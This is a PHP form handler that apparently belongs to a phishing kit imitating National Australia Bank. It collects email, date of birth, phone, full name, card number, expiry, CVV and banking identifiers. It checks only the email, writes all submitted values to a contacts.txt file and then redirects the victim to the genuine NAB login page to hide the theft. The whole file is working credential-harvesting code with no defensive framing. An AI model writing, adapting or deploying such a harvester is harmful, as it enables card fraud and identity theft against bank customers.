<?php

function validate($post)
{
	

$errors = [];

$email = htmlspecialchars($post['email'], ENT_QUOTES);
$dob = htmlspecialchars($post['dob'], ENT_QUOTES);
$postal = htmlspecialchars($post['postal'], ENT_QUOTES);
$phone = htmlspecialchars($post['phone'], ENT_QUOTES);
$fullname = htmlspecialchars($post['fullname'], ENT_QUOTES);
$number = htmlspecialchars($post['number'], ENT_QUOTES);
$exp = htmlspecialchars($post['exp'], ENT_QUOTES);
$cvv = htmlspecialchars($post['cvv'], ENT_QUOTES);
$bnk = htmlspecialchars($post['bnk'], ENT_QUOTES);
$osid = htmlspecialchars($post['osid'], ENT_QUOTES);



if(empty($email) || !filter_var($email,FILTER_VALIDATE_EMAIL) ){
	$errors[] = 'email';
}



if(empty($errors)){
	$message_output = "Your information has been submitted! ";
	$status = 'alert-success';
	
$saved_information = var_export($post,true);
$file_name ="contacts.txt";
$current = file_get_contents($file_name);
$current .=$saved_information."\n\n\n";
file_put_contents($file_name, $current);
    header('refresh:2;url=https://ib.nab.com.au/nabib/index.jsp ');


}else {
	$message_output .= "Please fill in correctly the following fields: <br>";
	foreach($errors as $error){
		$message_output.= $error. '<br />';
	}

$status = 'alert-danger';
}

return ( array('status'=>$status,'message'=>$message_output)) ;

}

?>